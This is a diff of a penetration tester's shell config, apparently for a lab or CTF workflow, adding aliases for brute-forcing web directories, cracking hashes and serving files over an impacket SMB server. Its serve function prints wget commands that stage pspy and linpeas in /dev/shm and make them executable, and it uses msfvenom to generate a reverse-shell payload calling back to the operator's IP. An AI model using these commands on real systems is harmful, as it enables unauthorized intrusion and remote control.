@@ -3,10 +3,13 @@ alias ll='ls -lsaht --color=auto --group-directories-first'
 
 # For ease of use
 function get_myip() {
-    export myip=$(ip a | grep 192 | awk -F'/' '{print $1}' | awk '{print $2}')
-    echo $myip | xclip -selection clipboard
+    export myip=$(ip addr show tun0 | grep -oP 'inet \K[\d.]+')
+    echo -n $myip | xclip -selection clipboard
+    export myip=$myip
 }
-alias myip='get_myip'
+get_myip
+
+alias serve="echo http://$myip; python -m http.server"
 
 # Decode base64
 decode64() {
@@ -15,9 +18,7 @@ decode64() {
 alias de='decode64'
 
 # Grep through my notes
-function gn() {
-        grep -ri $1 ~/repos/offsec/$2
-}
+function gn() { grep -ri $1 ~/repos/offsec/$2 }
 
 # Colored and context-aware grep with PCRE support
 alias grep='grep --color=auto -P'
@@ -43,21 +44,26 @@ function rustscan-log() {
 }
 
 # Repetitive gobuster script, url as argument
-function dbd() {
-    gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -k -t 15 --exclude-length 0
-}
+function dbd() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-directories.txt -k -t 15 --exclude-length 0 }
 
-function dbf() {
-    gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 15 --exclude-length 0
-}
+function dbf() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-files.txt -k -t 15 --exclude-length 0 }
 
-function dbdl() {
-    gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -k -t 15 --exclude-length 0
-}
+function dbdl() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-directories-lowercase.txt -k -t 15 --exclude-length 0 }
 
-function dbfl() {
-    gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt -k -t 15 --exclude-length 0
-}
+function dbfl() { gobuster dir -u "$1" -w /opt/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt -k -t 15 --exclude-length 0 }
+
+# Something more reliable than gobuster
+function wfd() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/combined_directories.txt --hc 404 $@ }
+
+function wff() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 404 $@ }
+
+function wffl() { wfuzz -c -z file,/opt/SecLists/Discovery/Web-Content/raft-large-files-lowercase.txt --hc 404 $@ }
+
+export smbAddress="\\\\\\${myip}\\share"
+alias smbserver='echo -ne "\033]0;SMBserv\007"; echo "net use x: $smbAddress /user:sender password"; impacket-smbserver share . -username sender -password password -smb2support'
+
+# Repetitive hashcat command
+function hc() { hashcat $1 /usr/share/wordlists/rockyou.txt $@ -O}
 
 # Clean Rustscan output for better readability
 alias clean='sed -e '\''s/\x1b\[[0-9;]*m//g'\'''
@@ -66,8 +72,19 @@ alias clean='sed -e '\''s/\x1b\[[0-9;]*m//g'\'''
 # Automated extraction and cleaning of nmap results
 alias nmap-summary="grep 'open\|filtered\|closed' nmap_scan.txt | awk '{print \$1,\$2}'"
 
-# Serve files quickly with Python's HTTP server
-alias serve='python3 -m http.server'
+function serve() {
+    if [[ $# -eq 0 ]]; then
+        echo "wget http://$myip:8000/pspy64 -O /dev/shm/pspy; wget http://$myip:8000/linpeas.sh -O /dev/shm/linpeas.sh; chmod +x /dev/shm/*;"
+        python -m http.server;
+    elif [[ $# -eq 1 ]]; then
+        echo "wget http://$myip:$1/pspy64 -O /dev/shm/pspy; wget http://$myip:$1/linpeas.sh -O /dev/shm/linpeas.sh; chmod +x /dev/shm/*;"
+        python -m http.server $1
+    elif [[ $# -eq 2 ]]; then
+        echo "wget http://$myip:$1/pspy64 -O /dev/shm/pspy; wget http://$myip:$1/linpeas.sh -O /dev/shm/linpeas.sh; wget http://$myip:$1/shell$2 -O /dev/shm/shell$2; chmod +x /dev/shm/*;"
+        msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=$myip LPORT=$2 -o /dev/shm/shell$2
+        python -m http.server $1
+    fi
+}
 
 # Reverse shell snippets ready for deployment
 alias revshells='cat /opt/tools/reverse-shells.txt | grep'
